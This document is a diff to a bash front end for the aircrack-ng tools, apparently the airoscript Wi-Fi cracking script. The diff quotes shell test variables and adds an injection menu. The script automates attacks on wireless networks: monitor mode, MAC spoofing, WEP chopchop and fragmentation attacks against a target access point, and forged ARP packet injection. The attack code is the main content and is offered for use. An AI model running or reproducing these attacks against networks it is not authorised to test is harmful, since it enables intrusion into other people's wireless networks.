@@ -102,19 +102,19 @@ function menu {
 # starts monitor mode on selected interface		
 function monitor_interface {
 IS_MONITOR=`$AIRMON start $WIFI |grep monitor`
-if [ $TYPE = RalinkUSB ]
+if [ "$TYPE" = "RalinkUSB" ]
 then
 iwpriv $WIFI rfmontx 1
 iwpriv $WIFI forceprism 1
 echo $IS_MONITOR
 
-elif [ $TYPE = Ralinkb/g ]
+elif [ "$TYPE" = "Ralinkb/g" ]
 then
 iwpriv $WIFI rfmontx 1
 iwpriv $WIFI forceprism 1
 echo $IS_MONITOR
 
-elif [ $TYPE = Atherosmadwifi-ng ]
+elif [ "$TYPE" = "Atherosmadwifi-ng" ]
 then
 $AIRMON stop ath0
 $AIRMON stop ath1
@@ -130,29 +130,28 @@ function setinterface {
 #INTERFACES=`iwconfig|grep --regexp=^[^:blank:].[:alnum:]|awk '{print $1}'`
 #INTERFACES=`iwconfig|egrep "^[a-Z]+[0-9]+" |awk '{print $1}'`
 INTERFACES=`ip link |egrep "^[0-9]+" | cut -d':' -f 2 | cut -d' ' -f 2 | grep -v "lo" |awk '{print $1}'`
-TYPE=`$AIRMON start $WIFI | grep monitor | awk '{print $2 $3}'`
-if [ $WIFI =  ]
+if [ "$WIFI" = "" ]
 then
 echo "=> Select your interface: (athX for madwifi devices)"
 echo ""
 select WIFI in $INTERFACES; do
 break;
 done
-echo ""
-echo " 	Interface to use is : $WIFI"
-echo " 	Interface type is   : $TYPE"
-echo ""
+TYPE=`$AIRMON start $WIFI | grep monitor |awk '{print $2 $3}'`
+clear
+echo "Interface used is : $WIFI"
+echo "Interface type is : $TYPE"
 testmac
 else
-echo ""
-echo " 	Interface to use is : $WIFI"
-echo " 	Interface type is   : $TYPE"
-echo ""
+TYPE=`$AIRMON start $WIFI | grep monitor |awk '{print $2 $3}'`
+clear
+echo "Interface used is : $WIFI"
+echo "Interface type is : $TYPE"
 testmac 
 fi
 }
 function testmac {
-if [ $TYPE = Atherosmadwifi-ng ]
+if [ "$TYPE" = "Atherosmadwifi-ng" ]
 then
 echo "Previous fake_mac : $FAKE_MAC"
 FAKE_MAC=`ifconfig $WIFI | grep $WIFI | awk '{print $5}' | cut -c -17  | sed -e "s/-/:/" | sed -e "s/\-/:/"  | sed -e "s/\-/:/" | sed -e "s/\-/:/" | sed -e "s/\-/:/"`
@@ -163,15 +162,15 @@ fi
 }
 function setinterface2 {
 INTERFACES=`ip link |egrep "^[0-9]+" | cut -d':' -f 2 | cut -d' ' -f 2 | grep -v "lo" |awk '{print $1}'`
-TYPE=`$AIRMON start $WIFI | grep monitor |awk '{print $4}'`
 echo "   Select your interface"
 echo " "
 select WIFI in $INTERFACES; do
 break;
 done
-echo "#######################################"
-echo "### Interface to use is : $WIFI"
-echo "### Interface type   is : $TYPE"
+TYPE=`$AIRMON start $WIFI | grep monitor |awk '{print $2 $3}'`
+clear
+echo "Interface used is : $WIFI"
+echo "Interface type is : $TYPE"
 testmac
 }
 # this function allows debugging of xterm commands
@@ -619,7 +618,7 @@ function wpaconfigure {
 		ping www.google.com
 }
 function witchcrack {
-if [ $Host_ENC = "WEP" ]
+if [ "$Host_ENC" = "WEP" ]
   		then
 		crack
 		else
@@ -664,13 +663,13 @@ set -- ${MANUAL_MAC}
 manualmacchanger
 }
 function fakemacchanger {
-if [ $TYPE = "RalinkUSB" ]
+if [ "$TYPE" = "RalinkUSB" ]
   		then
 		fakechangemacrausb
-		elif [ $TYPE = "Ralinkb/g" ]
+		elif [ "$TYPE" = "Ralinkb/g" ]
 		then
 		fakechangemacwlan
-		elif [ $TYPE = "Atherosmadwifi-ng" ]
+		elif [ "$TYPE" = "Atherosmadwifi-ng" ]
 		then
 		fakechangemacath
 		else
@@ -702,13 +701,13 @@ ifconfig $WIFI up
 iwconfig $WIFI mode monitor			
 }
 function macchanger {
-if [ $TYPE = "RalinkUSB" ]
+if [ "$TYPE" = "RalinkUSB" ]
 then
 changemacrausb
-elif [ $TYPE = "Ralinkb/g" ]
+elif [ "$TYPE" = "Ralinkb/g" ]
 then 
 changemacwlan
-elif [ $TYPE = "Atherosmadwifi-ng" ]
+elif [ "$TYPE" = "Atherosmadwifi-ng" ]
 then
 changemacath
 else
@@ -740,13 +739,13 @@ ifconfig $WIFI up
 iwconfig $WIFI mode monitor			
 }
 function manualmacchanger {
-if [ $TYPE = "RalinkUSB" ]
+if [ "$TYPE" = "RalinkUSB" ]
 then
 manualchangemacrausb
-elif [ $TYPE = "Ralinkb/g" ]
+elif [ "$TYPE" = "Ralinkb/g" ]
 then
 manualchangemacwlan
-elif [ $TYPE = "Atherosmadwifi-ng" ]
+elif [ "$TYPE" = "Atherosmadwifi-ng" ]
 then
 manualchangemacath
 else
@@ -778,7 +777,7 @@ ifconfig $WIFI up
 iwconfig $WIFI mode monitor				
 }
 function witchconfigure {
-if [ $Host_ENC = "WEP" ]
+if [ "$Host_ENC" = "WEP" ]
   		then
 		configure
 		else
@@ -899,14 +898,13 @@ function chopchopattack {
 clear
 rm -rf $DUMP_PATH/$Host_MAC*
 rm -rf replay_dec-*.xor
-capture &  fakeauth3 &  xterm $HOLD -title "ChopChop'ing: $Host_SSID" $BOTTOMLEFT -bg "#000000" -fg "#99CCFF" -e $AIREPLAY --chopchop -b $Host_MAC -h $FAKE_MAC $WIFI & menufonction
+capture &  fakeauth3 &  xterm -hold -title "ChopChop'ing: $Host_SSID" $BOTTOMLEFT -bg "#000000" -fg "#99CCFF" -e $AIREPLAY --chopchop -b $Host_MAC -h $FAKE_MAC $WIFI & injectmenu
 }
 function chopchopattackclient {
 clear
 rm -rf $DUMP_PATH/$Host_MAC*
 rm -rf replay_dec-*.xor
-echo "running chopchop with: $AIREPLAY --chopchop -h $Client_MAC $WIFI"
-capture &  xterm $HOLD -title "ChopChop'ing: $Host_SSID" $BOTTOMLEFT -bg "#000000" -fg "#99CCFF" -e $AIREPLAY --chopchop -h $Client_MAC $WIFI & menufonction
+capture &  xterm -hold -title "ChopChop'ing: $Host_SSID" $BOTTOMLEFT -bg "#000000" -fg "#99CCFF" -e $AIREPLAY --chopchop -h $Client_MAC $WIFI & injectmenu
 }
 function chopchopend {
 rm -rf $DUMP_PATH/chopchop_$Host_MAC*
@@ -924,7 +922,7 @@ rm -rf $DUMP_PATH/frag_*.cap
 rm -rf $DUMP_PATH/$Host_MAC*
 killall -9 airodump-ng aireplay-ng
 iwconfig $WIFI rate 1M channel $Host_CHAN mode monitor
-xterm $HOLD $BOTTOMLEFT -bg "#000000" -fg "#1DFF00" -title "Fragmentation attack on $Host_SSID" -e $AIREPLAY -5 -b $Host_MAC -h $FAKE_MAC -k $FRAG_CLIENT_IP -l $FRAG_HOST_IP $WIFI & capture & fakeauth3 &  menufonction
+xterm -hold $BOTTOMLEFT -bg "#000000" -fg "#1DFF00" -title "Fragmentation attack on $Host_SSID" -e $AIREPLAY -5 -b $Host_MAC -h $FAKE_MAC -k $FRAG_CLIENT_IP -l $FRAG_HOST_IP $WIFI & capture & fakeauth3 &  injectmenu
 }
 function fragnoclientend {
 iwconfig $WIFI rate 1M
@@ -937,7 +935,7 @@ rm -rf $DUMP_PATH/frag_*.cap
 rm -rf $DUMP_PATH/$Host_MAC*
 killall -9 airodump-ng aireplay-ng
 iwconfig $WIFI rate 2M channel $Host_CHAN mode monitor
-xterm $HOLD $BOTTOMLEFT -bg "#000000" -fg "#1DFF00" -title "Fragmentation attack on $Host_SSID" -e $AIREPLAY -5 -b $Host_MAC -h $Client_MAC -k $FRAG_CLIENT_IP -l $FRAG_HOST_IP $WIFI & capture &  menufonction
+xterm $HOLD $BOTTOMLEFT -bg "#000000" -fg "#1DFF00" -title "Fragmentation attack on $Host_SSID" -e $AIREPLAY -5 -b $Host_MAC -h $Client_MAC -k $FRAG_CLIENT_IP -l $FRAG_HOST_IP $WIFI & capture &  injectmenu
 }
 function fragmentationattackend {
 iwconfig $WIFI rate 2M
@@ -948,6 +946,32 @@ function pskarp {
 rm -rf $DUMP_PATH/arp_*.cap
 $ARPFORGE -0 -a $Host_MAC -h $Client_MAC -k $Client_IP -l $Host_IP -y $DUMP_PATH/dump*.xor -w $DUMP_PATH/arp_$Host_MAC.cap 	
 capture & xterm $HOLD $BOTTOMLEFT -bg "#000000" -fg "#99CCFF" -title "Sending forged ARP to: $Host_SSID" -e $AIREPLAY --interactive -r $DUMP_PATH/arp_$Host_MAC.cap -h $Client_MAC -x $INJECTRATE $WIFI & menufonction
+}
+function injectmenu {
+while true; do
+  echo "#######################################"
+  echo "###  Select task to perform         ###"
+  echo "###                                 ###"
+  echo "###   1) Frag injection             ###"
+  echo "###   2) Frag with client injection ###"
+  echo "###   3) Chochop injection          ###"
+  echo "###   4) Chopchop with client inj.  ###"
+  echo "###   5) ARP inject from xor (PSK)  ###"
+  echo "###   7) Return to main menu        ###"
+  echo "###                                 ###"
+  echo "#######################################"
+  read yn
+  echo ""
+  case $yn in
+    1 ) fragnoclientend ; break ;;
+    2 ) fragmentationattackend ; break ;;
+    3 ) chopchopend ; break ;; 
+    4 ) chopchopclientend ; break ;;
+    5 ) pskarp ; break ;;
+    7 ) break ;;
+    * ) echo "unknown response. Try again" ;;
+  esac
+done 
 }
 function optionmenu {
 while true; do
